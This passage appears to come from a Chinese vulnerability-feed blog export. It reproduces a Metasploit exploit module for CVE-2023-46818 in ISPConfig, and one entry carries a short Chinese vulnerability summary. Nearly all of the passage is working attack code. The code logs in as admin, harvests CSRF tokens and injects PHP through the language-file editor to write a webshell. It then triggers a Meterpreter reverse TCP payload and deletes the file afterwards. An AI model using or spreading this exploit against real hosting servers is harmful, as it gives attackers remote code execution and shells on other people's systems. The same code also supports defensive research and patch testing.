enabled.<br>        &#125;,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;syfi&#x27;</span> <span class="hljs-comment"># Discovery and PoC</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/SyFi/CVE-2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/KIS-2023-13&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/pocs/CVE-2023-46818.php&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Automatic PHP&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2023-10-24&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;php/meterpreter/reverse_tcp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The URI path to ISPConfig&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator username&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator password&#x27;</span>])<br>    ])<br>  end<br><br>  def check<br>    print_status(<span class="hljs-string">&#x27;Checking if the target is ISPConfig...&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>)<br>    &#125;)<br>    <span class="hljs-keyword">return</span> CheckCode::Unknown <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res.body.include?(<span class="hljs-string">&#x27;ISPConfig&#x27;</span>) &amp;&amp; (res.body.include?(<span class="hljs-string">&#x27;login&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;username&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;password&#x27;</span>))<br>      print_good(<span class="hljs-string">&#x27;ISPConfig installation detected&#x27;</span>)<br>      <span class="hljs-keyword">return</span> CheckCode::Detected<br>    end<br>    CheckCode::Safe<br>  end<br><br>  def authenticate<br>    print_status(<span class="hljs-string">&quot;Attempting login with username &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&#x27; and password &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]&#125;</span>&#x27;&quot;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res.body.match(<span class="hljs-regexp">/Username or Password wrong/i</span>)<br>      fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login failed: Invalid credentials&#x27;</span>)<br>    end<br>    <span class="hljs-keyword">if</span> res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>] &amp;&amp; res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>].include?(<span class="hljs-string">&#x27;admin&#x27;</span>) ||<br>       res.body.downcase.include?(<span class="hljs-string">&#x27;dashboard&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Login successful!&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    end<br>    print_warning(<span class="hljs-string">&#x27;Login status unclear, attempting to continue...&#x27;</span>)<br>    <span class="hljs-literal">true</span><br>  end<br><br>  def inject_payload<br>    print_status(<span class="hljs-string">&#x27;Injecting PHP payload...&#x27;</span>)<br>    @payload_file = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;Rex::Text.rand_text_alpha_lower(<span class="hljs-number">8</span>)&#125;</span>.php&quot;</span><br>    php_payload = payload.encoded<br>    injection = <span class="hljs-string">&quot;&#x27;];file_put_contents(&#x27;<span class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;,&#x27;&lt;?php <span class="hljs-subst">#&#123;php_payload&#125;</span> ?&gt;&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Unable to access language_edit.php&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    csrf_id_match = res.body.match(<span class="hljs-regexp">/_csrf_id&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    csrf_key_match = res.body.match(<span class="hljs-regexp">/_csrf_key&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    <span class="hljs-keyword">unless</span> csrf_id_match &amp;&amp; csrf_key_match<br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;CSRF tokens not found!&#x27;</span>)<br>    end<br>    csrf_id = csrf_id_match[<span class="hljs-number">1</span>]<br>    csrf_key = csrf_key_match[<span class="hljs-number">1</span>]<br>    print_good(<span class="hljs-string">&quot;Extracted CSRF tokens: ID=<span class="hljs-subst">#&#123;csrf_id[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>..., KEY=<span class="hljs-subst">#&#123;csrf_key[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>...&quot;</span>)<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Injection request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    payload_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, @payload_file)<br>    print_good(<span class="hljs-string">&quot;Payload successfully injected: <span class="hljs-subst">#&#123;@payload_file&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload_url<br>  end<br><br>  def trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Triggering PHP payload...&#x27;</span>)<br>    <span class="hljs-comment"># Small delay to ensure the file is written</span><br>    sleep(<span class="hljs-number">1</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; payload_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">if</span> res &amp;&amp; res.code == <span class="hljs-number">200</span><br>      print_good(<span class="hljs-string">&#x27;PHP payload triggered successfully&#x27;</span>)<br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Payload trigger response was unexpected&#x27;</span>)<br>    end<br>  end<br><br>  def cleanup<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> @payload_file<br>    print_status(<span class="hljs-string">&#x27;Cleaning up payload file...&#x27;</span>)<br>    <span class="hljs-comment"># Use the same vulnerability to delete the file</span><br>    injection = <span class="hljs-string">&quot;&#x27;];unlink(&#x27;<span class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> res<br>    csrf_id_match = res.body.match(<span class="hljs-regexp">/_csrf_id&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    csrf_key_match = res.body.match(<span class="hljs-regexp">/_csrf_key&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> csrf_id_match &amp;&amp; csrf_key_match<br>    csrf_id = csrf_id_match[<span class="hljs-number">1</span>]<br>    csrf_key = csrf_key_match[<span class="hljs-number">1</span>]<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    print_good(<span class="hljs-string">&quot;Payload file <span class="hljs-subst">#&#123;@payload_file&#125;</span> cleaned up&quot;</span>)<br>  end<br><br>  def exploit<br>    authenticate<br>    payload_url = inject_payload<br>    print_status(<span class="hljs-string">&#x27;Starting payload handler...&#x27;</span>)<br>    trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Manual trigger information:&#x27;</span>)<br>    print_line(<span class="hljs-string">&quot;URL: <span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&quot;</span>)<br>    print_line(<span class="hljs-string">&quot;Manual trigger: curl &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&#x27;&quot;</span>)<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig language_edit.php PHP代码注入&lt;/p&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ISPConfig language_editphp PHP代码注入漏洞</title>
    <link href="http://example.com/2025/06/25/github_3793711139/"/>
    <id>http://example.com/2025/06/25/github_3793711139/</id>
    <published>2025-06-25T22:15:16.712Z</published>
    <updated>2025-06-25T22:15:16.708Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 在ISPConfig 3.2.11p1之前的版本中，发现了一个问题。如果启用了admin_allow_langedit，管理员可以通过语言文件编辑器实现PHP代码注入。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/d787444137b7c50703accdaba0204ad230b802ae/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb">https://github.com/rapid7/metasploit-framework/blob/d787444137b7c50703accdaba0204ad230b802ae/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  prepend Msf::Exploit::Remote::AutoCheck<br>  include Msf::Exploit::Remote::HttpClient<br>  include Msf::Exploit::FileDropper<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;ISPConfig language_edit.php PHP Code Injection&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          An issue was discovered <span class="hljs-keyword">in</span> ISPConfig before <span class="hljs-number">3.2</span>.<span class="hljs-number">11p</span>1. PHP code injection can be achieved <span class="hljs-keyword">in</span> the language file editor <span class="hljs-keyword">by</span> an admin <span class="hljs-keyword">if</span> admin_allow_langedit <span class="hljs-keyword">is</span> enabled.<br>        &#125;,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;syfi&#x27;</span> <span class="hljs-comment"># Discovery and PoC</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/SyFi/CVE-2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/KIS-2023-13&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/pocs/CVE-2023-46818.php&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Automatic PHP&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2023-10-24&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;php/meterpreter/reverse_tcp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The URI path to ISPConfig&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator username&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator password&#x27;</span>])<br>    ])<br><br>    register_advanced_options([<br>      OptInt.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;LOGIN_TIMEOUT&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Timeout for login request&#x27;</span>, <span class="hljs-number">15</span>]),<br>      OptBool.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;DELETE_SHELL&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Delete webshell after session&#x27;</span>, <span class="hljs-literal">true</span>])<br>    ])<br>  end<br><br>  def check<br>    print_status(<span class="hljs-string">&#x27;Checking if target is ISPConfig...&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    &#125;)<br>    <span class="hljs-keyword">return</span> CheckCode::Unknown <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res.body.include?(<span class="hljs-string">&#x27;ISPConfig&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;ispconfig&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;ISPConfig installation detected&#x27;</span>)<br>      <span class="hljs-keyword">return</span> CheckCode::Detected<br>    end<br>    CheckCode::Safe<br>  end<br><br>  def authenticate<br>    print_status(<span class="hljs-string">&quot;Attempting login with username &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&#x27; and password &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]&#125;</span>&#x27;&quot;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> 